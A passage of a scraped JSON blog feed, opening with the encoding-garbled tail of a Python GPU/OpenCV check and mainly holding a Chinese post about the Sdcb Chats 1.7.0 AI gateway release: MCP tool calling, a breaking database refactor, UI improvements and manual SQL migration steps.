éªŒè¯3ï¼šGPUè®¾å¤‡æ˜¯å¦è¯†åˆ«\nprint(\"GPUè®¾å¤‡ä¿¡æ¯ï¼š\", torch.cuda.get_device_name(0) if torch.cuda.is_available() else \"æœªè¯†åˆ«åˆ°GPU\")\n\n# éªŒè¯4ï¼šOpenCVæ˜¯å¦æ­£å¸¸å·¥ä½œï¼ˆä¸ŽPyTorchæ— å†²çªï¼‰\nprint(\"OpenCVç‰ˆæœ¬ï¼š\", cv2.__version__)\n</code></pre>\n<p>è¿è¡Œç»“æžœå¦‚ä¸‹ï¼š</p>\n<p><img alt=\"image-20260115180249867\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092258102-573191144.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 10:00</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lichengxiao\">ç†¬å¤œä¸æ—©ç¡</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">179</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "没有前端后，我把 MCP 做进了 Chats 1.7.0 AI 网关",
      "link": "https://www.cnblogs.com/sdcb/p/19489261/20260115-chats-170",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sdcb/p/19489261/20260115-chats-170\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 08:45\">\n    <span>没有前端后，我把 MCP 做进了 Chats 1.7.0 AI 网关</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>这是一篇补档文章。</p>\n<p>如果你还不了解 <strong>Sdcb Chats</strong>：简单说，这是一个支持 20+ 主流模型服务商的 AI 网关。它不只能让你在一个统一界面里聚合管理所有模型，同时也兼容标准 API 协议，支持 Docker 一键部署。</p>\n<p>现在回头看，Sdcb Chats 最新版本已经到了 1.10，后续又融合了交错思考、Code Interpreter、多模态和企业级权限等“看起来更酷”的能力。但如果要问我：<strong>哪个版本是我个人开发节奏的分水岭？</strong>答案大概率还是 1.7.0。</p>\n<p>因为 1.7.0 不只是“加了个功能”，而是有三件事同时发生：</p>\n<ul>\n<li>MCP（Model Context Protocol）在 Chats 里真正落地，终于从“能聊”走向“能调用工具”，理论上能支持任何符合 MCP 的模型服务商和工具服务商，比如知识库、搜索引擎、计算引擎等；</li>\n<li>数据模型与数据库大改（破坏性变更），为后续演进把地基打牢；</li>\n<li>更关键的是：从这个版本开始，Chats 基本变成我一个人维护了——而我第一次深度尝试了 AI 的“氛围编程（Vibe Coding）”。</li>\n</ul>\n<hr />\n<h2 id=\"三个月空窗没有前端的我第一次把ai当同事\">三个月空窗：没有前端的我，第一次把AI当同事</h2>\n<p>距离上次 1.6 正式发布过去了 3 个多月。这期间，和我搭档做 Chats 前端的朋友因为有事没办法继续参与开发。没有前端开发，我一个后端在 Next.js / React 这套体系里，生产力几乎直接归零——项目一度陷入停滞。</p>\n<p>于是我第一次认真尝试把 AI 当作“副驾驶”：从页面布局、状态管理、组件拆分，到各种奇怪的 UI 边角行为（尤其是流式输出和工具调用展示），都让 AI 一起参与。</p>\n<p>可以这样说：</p>\n<ul>\n<li>Chats 1.7 之前：基本还是人类一行代码一行代码撸上去的；</li>\n<li>Chats 1.7.0 起：我开始“系统性”地 Vibe Coding，<strong>尤其是在我并不熟的 React 上，生产力提升非常明显</strong>；</li>\n<li>也从这时起，Chats 的维护者（几乎）变成了我一个人。</li>\n</ul>\n<p>所以这篇文章标题里写“感谢 AI”，不是客套，是事实。</p>\n<hr />\n<h2 id=\"170-的核心mcp-协议全面落地\">1.7.0 的核心：MCP 协议全面落地</h2>\n<p>如果你把 Chats 只当成一个“统一模型网关 + 漂亮 UI”的聊天前端，那它的上限就只是“把模型回答展示出来”。但 MCP 的出现，让“模型能做事”有了更统一、更可组合的方式。</p>\n<p>在 1.7.0 里，MCP 的落地不是停留在“能连上”，而是把整条链路打通了：</p>\n<ul>\n<li>\n<p>后端有完整的 MCP 实体与权限关系（Server、Tool、User 授权、Chat 绑定）；</p>\n</li>\n<li>\n<p>前端设置页新增 MCP 管理：新增/编辑 Server、抓取工具、分配用户；<br />\n<img alt=\"02-mcp-list\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213720114-1699629549.png\" /><br />\n<img alt=\"03-mcp-edit\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213726314-440296231.png\" /><br />\n<img alt=\"04-mcp-assign-user\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213729222-1808157068.png\" /></p>\n</li>\n<li>\n<p>会话侧可绑定多个 MCP Server，并在会话前校验当前用户权限；</p>\n</li>\n<li>\n<p>工具调用全程走流式输出，参数与结果能以结构化方式进入消息内容，前端也能更好地可视化展示。<br />\n<img alt=\"05-mcp-call\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213734256-659322865.png\" /></p>\n</li>\n</ul>\n<p>对我而言，这意味着 Chats 从“聊天 UI”升级成了“工具编排平台”的雏形：你可以给不同的 Chat Span 配置不同的工具集合，让它们在同一套对话体验里发挥作用。</p>\n<hr />\n<h2 id=\"工具调用体验不只是能用而是要看得懂\">工具调用体验：不只是能用，而是要“看得懂”</h2>\n<p>做过工具调用的人都知道：<strong>能调用是一回事，让用户看懂发生了什么是另一回事。</strong></p>\n<p>1.7.0 在工具调用的事件与消息结构上做了比较大的增强：SSE 事件更丰富、消息内容里新增了工具请求/响应的类型，前端能把“调用了什么工具、传了什么参数、拿到了什么结果”以更清晰的方式展示出来。<br />\n<img alt=\"06-sse-response-line\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213740193-1073025986.png\" /></p>\n<p>这件事看起来偏“体验”，但它会直接影响你是否愿意在真实业务里用工具调用：当工具一多、调用链一长，如果 UI 只是一坨 Markdown 混在一起，那基本等于不可用。</p>\n<hr />\n<h2 id=\"破坏性变更数据库与数据模型的大规模重构\">破坏性变更：数据库与数据模型的大规模重构</h2>\n<p>1.7.0 还有一个绕不开的关键词：<strong>破坏性变更</strong>。</p>\n<p>为了提升可维护性与可观测性，我在这个版本里对消息存储层做了重构（比如把 <code>Message</code> 拆分为 <code>ChatTurn/Step</code> 的分层结构），同时还伴随了用量关联、默认值约束、排序字段等一系列调整。<br />\n<img alt=\"07-db-schema\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115213746807-893994786.png\" /></p>\n<p>这种重构的特点是：你短期会痛一次，但长期会省很多命。尤其是当你后面要持续叠加“推理/工具/多模态/审计/性能统计”这些能力时，底层结构是否清晰，决定了你是在“继续写功能”，还是在“每加一个功能都要拆一次墙”。</p>\n<hr />\n<h2 id=\"一些我很在意的细节改进\">一些我很在意的细节改进</h2>\n<p>除了 MCP 和数据库重构，1.7.0 还把不少“用起来会爽一点”的点补齐了，比如：</p>\n<ul>\n<li>模型/密钥/预设支持拖拽排序（Provider/Key/Model 的组织方式更清晰）；<br />\n<img alt=\"\" src=\"https://io.starworks.cc:88/cv-public/2026/08-drag-reordering.avif\" /></li>\n<li>聊天再生成能力增强：单条重新生成、从某条用户消息开始重新生成整段；<br />\n<img alt=\"\" src=\"https://io.starworks.cc:88/cv-public/2026/09-regenerate.avif\" /></li>\n<li>Markdown Mermaid 渲染升级：暗/亮主题适配、全屏查看、流式友好；<br />\n<img alt=\"\" src=\"https://io.starworks.cc:88/cv-public/2026/10-mermaid.avif\" /></li>\n<li>图片生成尺寸控制：在会话中指定常用尺寸；</li>\n<li>OpenAI 兼容与第三方联调增强（工具调用适配修复、登录兼容优化等）。<br />\n<img alt=\"11-image-size-control\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260115214018456-481361818.png\" /><br />\n这些看起来零碎，但它们共同指向同一个目标：<strong>把 Chats 从“功能堆叠”推向“可长期使用的产品质感”。</strong></li>\n</ul>\n<hr />\n<h2 id=\"升级与数据迁移不支持自动迁移请手动跑-sql只提供-sql-server\">升级与数据迁移：不支持自动迁移，请手动跑 SQL（只提供 SQL Server）</h2>\n<p>Sdcb Chats的数据库变更 <strong>不支持自动数据迁移</strong>。升级时你需要<strong>手动执行 SQL 迁移脚本</strong>，并且目前只提供了 <strong>SQL Server</strong> 的迁移脚本：</p>\n<ul>\n<li>1.7.0 迁移脚本：<code>src/scripts/db-migration/1.7/20250516-mcp.sql</code></li>\n</ul>\n<p>基本步骤也很朴素：</p>\n<ol>\n<li>先备份数据库；</li>\n<li>在 SQL Server 上执行上面的迁移脚本；</li>\n</ol>\n<p>如果你用的是 SQLite 或 Postgres……我建议你像我一样：把 SQL 甩给 AI，让它帮你改成 SQLite/Postgres 版本，然后你再一边跑一边修，或者如果你能接受，先删库，Chats 会在第一次启动时自动创建新表结构。</p>\n<hr />\n<h2 id=\"致谢\">致谢</h2>\n<p>1.7.0 的发布说明里，我特别感谢过社区贡献（比如<a href=\"https://github.com/sdcb/chats/pull/96\" rel=\"noopener nofollow\" target=\"_blank\">修复登录页面运行时错误的 PR #96</a>）。而在这篇补档里，我还想加一个更个人的致谢：感谢 AI。</p>\n<hr />\n<p>感谢阅读！喜欢的朋友请给我的Github项目一个star：<a href=\"https://github.com/sdcb/chats\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/sdcb/chats</a><br />\n有什么想法也欢迎在评论区留言交流，也欢迎加入我的 <strong>Chats QQ群：498452653</strong>，我们一起探索更多AI技术硬核玩法。</p>\n<p>微信群：<img alt=\"\" src=\"https://io.starworks.cc:88/cv-public/2026/chats-wxg-qr.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 08:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sdcb\">.NET骚操作</a>&nbsp;\n阅读(<span id=\"post_view_count\">413</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}